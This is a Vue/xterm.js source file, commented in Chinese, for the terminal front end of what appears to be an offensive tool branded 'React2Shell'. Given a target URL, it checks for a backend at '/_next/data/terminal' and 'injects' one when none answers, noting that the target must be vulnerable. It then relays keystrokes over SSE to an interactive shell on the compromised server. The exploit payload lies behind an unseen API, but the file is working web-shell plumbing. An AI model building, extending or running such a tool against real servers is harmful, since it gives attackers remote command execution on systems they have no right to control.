/**
 * POC 虚拟终端功能 Composable
 * 负责 xterm.js 终端管理
 */
import { ref, nextTick } from 'vue'
import { Terminal } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import { WebLinksAddon } from 'xterm-addon-web-links'

export function usePocTerminal() {
  const xtermContainer = ref(null)
  let terminal = null
  let fitAddon = null
  let terminalInitialized = false
  let terminalWebSocket = null
  let terminalSessionId = null
  let terminalConnecting = false
  let resizeObserver = null

  // 处理终端大小变化
  const handleTerminalResize = () => {
    if (fitAddon && terminal) {
      try {
        fitAddon.fit()
      } catch (e) {
        console.error('Terminal resize failed:', e)
      }
    }
  }

  // 初始化终端
  const initTerminal = async (currentUrl, targetPlatform) => {
    if (!xtermContainer.value || terminalInitialized || terminalConnecting) return

    if (targetPlatform === 'win32') {
      console.log('目标平台为 Windows，跳过虚拟终端初始化')
      return
    }

    terminalConnecting = true

    try {
      // 清理旧的 SSE 监听器
      if (window.api?.terminal?.removeSSEListeners) {
        window.api.terminal.removeSSEListeners()
        console.log('已清理旧的 SSE 监听器')
      }

      // 清理旧终端
      if (terminal) {
        terminal.dispose()
        terminal = null
      }

      if (terminalWebSocket) {
        terminalWebSocket.close()
        terminalWebSocket = null
      }

      // 创建新终端
      terminal = new Terminal({
        cursorBlink: true,
        fontSize: 14,
        fontFamily: 'Consolas, "Courier New", monospace',
        convertEol: true,
        scrollback: 1000,
        theme: {
          background: '#1e1e1e',
          foreground: '#d4d4d4',
          cursor: '#d4d4d4',
          selection: '#264f78',
          black: '#000000',
          red: '#cd3131',
          green: '#0dbc79',
          yellow: '#e5e510',
          blue: '#2472c8',
          magenta: '#bc3fbc',
          cyan: '#11a8cd',
          white: '#e5e5e5',
          brightBlack: '#666666',
          brightRed: '#f14c4c',
          brightGreen: '#23d18b',
          brightYellow: '#f5f543',
          brightBlue: '#3b8eea',
          brightMagenta: '#d670d6',
          brightCyan: '#29b8db',
          brightWhite: '#e5e5e5'
        },
        cols: 80,
        rows: 24
      })

      // 添加插件
      fitAddon = new FitAddon()
      terminal.loadAddon(fitAddon)
      terminal.loadAddon(new WebLinksAddon())

      // 挂载到容器
      terminal.open(xtermContainer.value)

      await nextTick()

      // 初始化 ResizeObserver 监听容器大小变化
      if (xtermContainer.value) {
        resizeObserver = new ResizeObserver(() => {
          handleTerminalResize()
        })
        resizeObserver.observe(xtermContainer.value)
      }

      // 延迟调用 fit 确保容器已经有正确的尺寸
      setTimeout(() => {
        handleTerminalResize()
      }, 100)

      // 显示 ASCII 艺术字
      terminal.writeln('\x1b[1;36m')
      terminal.writeln('    ____                  __  ___   _____ __         ____')
      terminal.writeln('   / __ \\___  ____ ______/ /_|__ \\ / ___// /_  ___  / / /')
      terminal.writeln('  / /_/ / _ \\/ __ `/ ___/ __/__/ / \\__ \\/ __ \\/ _ \\/ / / ')
      terminal.writeln(' / _, _/  __/ /_/ / /__/ /_ / __/ ___/ / / / /  __/ / /  ')
      terminal.writeln('/_/ |_|\\___/\\__,_/\\___/\\__//____//____/_/ /_/\\___/_/_/   ')
      terminal.writeln('\x1b[0m')
      terminal.writeln('\x1b[90m目标: ' + currentUrl + '\x1b[0m')
      terminal.writeln('')
      terminal.writeln('\x1b[36m[*]\x1b[0m 正在初始化虚拟终端，请稍候...')

      const apiPath = '/_next/data/terminal'
      const apiUrl = currentUrl + apiPath

      terminal.writeln('\x1b[36m[*]\x1b[0m 正在检测虚拟终端后端服务...')

      let createResult = await window.api.terminal.createSession(apiUrl + '?action=create')
      let needsInjection = !createResult.success

      if (needsInjection) {
        terminal.writeln('\x1b[33m[*]\x1b[0m 后端服务不存在，正在注入...')

        const injectResult = await window.api.terminal.create(currentUrl, apiPath)

        if (!injectResult.success) {
          terminal.writeln('\x1b[31m[!]\x1b[0m 后端注入失败: ' + injectResult.error)
          terminal.writeln('\x1b[90m    提示: 请确保目标服务器存在漏洞\x1b[0m')
          terminalConnecting = false
          return
        }

        terminal.writeln('\x1b[32m[✓]\x1b[0m 后端注入成功')
        terminal.writeln('\x1b[36m[*]\x1b[0m 正在创建会话...')
        createResult = await window.api.terminal.createSession(apiUrl + '?action=create')

        if (!createResult.success) {
          terminal.writeln('\x1b[31m[!]\x1b[0m 创建会话失败: ' + (createResult.error || '未知错误'))
          terminalConnecting = false
          return
        }
      } else {
        terminal.writeln('\x1b[32m[✓]\x1b[0m 检测到后端服务已存在')
        terminal.writeln('\x1b[36m[*]\x1b[0m 正在创建会话...')
      }

      terminalSessionId = createResult.sessionId

      terminal.writeln('\x1b[32m[✓]\x1b[0m 会话创建成功')
      terminal.writeln('\x1b[32m[✓]\x1b[0m 虚拟终端初始化完成')
      terminal.writeln('')
      terminal.writeln('\x1b[1;33m按 Enter 进入虚拟终端\x1b[0m')
      terminal.writeln('')

      // 等待用户按 Enter 键
      let waitingForEnter = true
      const enterKeyDisposable = terminal.onData((data) => {
        if (waitingForEnter && (data === '\r' || data === '\n')) {
          waitingForEnter = false
          enterKeyDisposable.dispose()
          connectSSE(terminal, apiUrl, terminalSessionId)
        }
      })

      // 监听窗口大小变化
      window.addEventListener('resize', handleTerminalResize)
    } catch (error) {
      console.error('初始化终端失败:', error)
      if (terminal) {
        terminal.writeln('\x1b[31m错误: ' + error.message + '\x1b[0m')
      }
    } finally {
      terminalConnecting = false
    }
  }

  // 连接 SSE 流
  const connectSSE = async (terminal, apiUrl, sessionId) => {
    terminal.writeln('\x1b[36m[*]\x1b[0m 正在连接虚拟终端...')
    terminal.writeln('')

    const sseUrl = apiUrl + '?action=stream&sid=' + sessionId
    console.log('Connecting to SSE:', sseUrl)

    let sseConnectionId = null

    const connectTimeout = setTimeout(() => {
      if (!terminalInitialized) {
        terminal.writeln('\x1b[31m✗ SSE 连接超时\x1b[0m')
        terminal.writeln('\x1b[90m提示: 后端可能未成功注入\x1b[0m')
        if (sseConnectionId) {
          window.api.terminal.closeSSE(sseConnectionId)
        }
      }
    }, 10000)

    // 监听 SSE 事件
    window.api.terminal.onSSEOpen((data) => {
      if (data.connectionId === sseConnectionId) {
        clearTimeout(connectTimeout)
        console.log('SSE connected successfully')
      }
    })

    window.api.terminal.onSSEMessage((msgData) => {
      if (msgData.connectionId !== sseConnectionId) return

      try {
        const data = JSON.parse(msgData.data)

        if (data.type === 'connected') {
          terminal.clear()
          terminalInitialized = true

          setTimeout(async () => {
            try {
              const inputUrl = apiUrl + '?action=input&sid=' + sessionId
              await window.api.terminal.sendInput(inputUrl, '\n')
            } catch (error) {
              console.error('自动发送回车失败:', error)
            }
          }, 500)
        } else if (data.type === 'stdout' || data.type === 'stderr' || data.type === 'echo') {
          try {
            const binaryString = atob(data.data)
            const bytes = new Uint8Array(binaryString.length)
            for (let i = 0; i < binaryString.length; i++) {
              bytes[i] = binaryString.charCodeAt(i)
            }
            const text = new TextDecoder('utf-8').decode(bytes)
            if (terminal) {
              terminal.write(text)
            }
          } catch (error) {
            console.error('解码输出失败:', error)
            const text = atob(data.data)
            if (terminal) {
              terminal.write(text)
            }
          }
        } else if (data.type === 'exit') {
          if (terminal) {
            terminal.writeln('\r\n\x1b[33m进程已退出，代码: ' + data.code + '\x1b[0m')
          }
          terminalInitialized = false
        }
      } catch (error) {
        console.error('解析 SSE 消息失败:', error)
      }
    })

    window.api.terminal.onSSEError((data) => {
      if (data.connectionId !== sseConnectionId) return
      clearTimeout(connectTimeout)
      console.error('SSE 错误:', data.error)
      if (terminal) {
        terminal.writeln('\r\n\x1b[31m✗ SSE 连接错误\x1b[0m')
        terminal.writeln('\x1b[90m提示: ' + data.error + '\x1b[0m')
      }
    })

    window.api.terminal.onSSEClose((data) => {
      if (data.connectionId !== sseConnectionId) return
      console.log('SSE 连接关闭')
      if (terminal && terminalInitialized) {
        terminal.writeln('\r\n\x1b[33m连接已关闭\x1b[0m')
      }
      terminalInitialized = false
    })

    try {
      const result = await window.api.terminal.connectSSE(sseUrl)
      if (result.success) {
        sseConnectionId = result.connectionId
        console.log('SSE 连接已建立，ID:', sseConnectionId)
      } else {
        clearTimeout(connectTimeout)
        terminal.writeln('\x1b[31m✗ 连接失败: ' + (result.error || '未知错误') + '\x1b[0m')
      }
    } catch (error) {
      clearTimeout(connectTimeout)
      console.error('连接 SSE 失败:', error)
      terminal.writeln('\x1b[31m✗ 连接异常: ' + error.message + '\x1b[0m')
    }

    // 监听用户输入
    terminal.onData(async (data) => {
      if (terminalInitialized && sessionId) {
        try {
          const inputUrl = apiUrl + '?action=input&sid=' + sessionId
          await window.api.terminal.sendInput(inputUrl, data)
        } catch (error) {
          console.error('发送输入失败:', error)
        }
      }
    })
  }

  // 清理终端
  const cleanup = () => {
    if (window.api?.terminal?.removeSSEListeners) {
      window.api.terminal.removeSSEListeners()
    }

    if (terminalWebSocket) {
      try {
        terminalWebSocket.close()
      } catch (e) {
        console.error('关闭 SSE 连接失败:', e)
      }
      terminalWebSocket = null
    }

    if (resizeObserver) {
      resizeObserver.disconnect()
      resizeObserver = null
    }

    if (terminal) {
      try {
        terminal.dispose()
      } catch (e) {
        console.error('销毁终端失败:', e)
      }
      terminal = null
    }

    window.removeEventListener('resize', handleTerminalResize)
  }

  return {
    xtermContainer,
    terminalInitialized: () => terminalInitialized,
    initTerminal,
    cleanup
  }
}
